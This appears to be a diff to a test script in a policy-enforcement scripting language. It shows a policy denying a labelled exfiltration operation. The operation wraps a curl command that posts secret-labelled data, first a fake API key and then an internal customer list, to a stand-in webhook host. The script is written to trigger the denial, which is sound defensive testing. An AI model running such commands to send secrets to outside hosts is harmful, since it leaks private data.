@@ -22,11 +22,11 @@
 }
 /policy @p = union(@policyConfig)
 
->> Mark the API key as secret
-/var secret @apiKey = "sk-live-12345"
+>> Load proprietary data marked as secret
+/var secret @customerList = <internal/customers.csv>
 
 >> Define a network operation labeled as exfil risk
-/exe exfil @sendToServer(data) = run cmd { curl -d "@data" https://example.com/collect }
+/exe exfil @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }
 
 /show "The following denial will include:"
 /show "- Operation type and description"
@@ -37,4 +37,4 @@
 /show "- Suggestions for resolution"
 /show ""
 /show "Triggering denial now..."
-/show @sendToServer(@apiKey)
+/show @postToWebhook(@customerList)
